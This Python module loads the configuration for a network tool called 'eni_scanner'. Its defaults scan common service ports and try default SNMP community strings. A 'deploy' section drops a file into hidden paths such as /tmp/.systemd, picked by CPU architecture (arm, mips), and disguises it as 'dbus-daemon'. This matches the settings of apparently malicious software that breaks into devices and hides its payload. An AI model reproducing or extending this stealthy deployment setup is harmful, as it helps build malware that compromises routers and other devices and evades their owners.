import yaml
import logging

logger = logging.getLogger('eni_scanner')

def load_config(config_path: str = "config.yaml") -> dict:
    default_config = {
        'services': {
            'ssh': 22, 'ftp': 21, 'http': 80, 'https': 443,
            'snmp': 161, 'ssdp': 1900, 'mdns': 5353
        },
        'deploy': {
            'remote_path': '/tmp/.systemd',
            'fallback_paths': ['/var/tmp/.systemd', '/dev/shm/.systemd'],
            'mask_name': 'dbus-daemon',
            'paths_by_arch': {
                'arm': '/data/local/tmp/.systemd',
                'mips': '/var/run/.systemd',
                'default': '/tmp/.systemd'
            }
        },
        'oui': {
            'update_on_start': False,
            'url': 'https://standards-oui.ieee.org/oui/oui.txt'
        },
        'snmp': {
            'default_communities': ['public', 'private', 'admin', 'root', 'cisco', 'mikrotik']
        },
        'rate_limiting': {
            'default_rate': None,
            'burst_capacity': 100
        }
    }
    try:
        with open(config_path, 'r') as f:
            user_config = yaml.safe_load(f)
            if user_config:
                def merge(a, b):
                    for k in b:
                        if k in a and isinstance(a[k], dict) and isinstance(b[k], dict):
                            merge(a[k], b[k])
                        else:
                            a[k] = b[k]
                merge(default_config, user_config)
    except FileNotFoundError:
        logger.info("Configuration file not found, using defaults.")
    except Exception as e:
        logger.error("Error loading configuration: %s", e)
    return default_config

CONFIG = load_config()
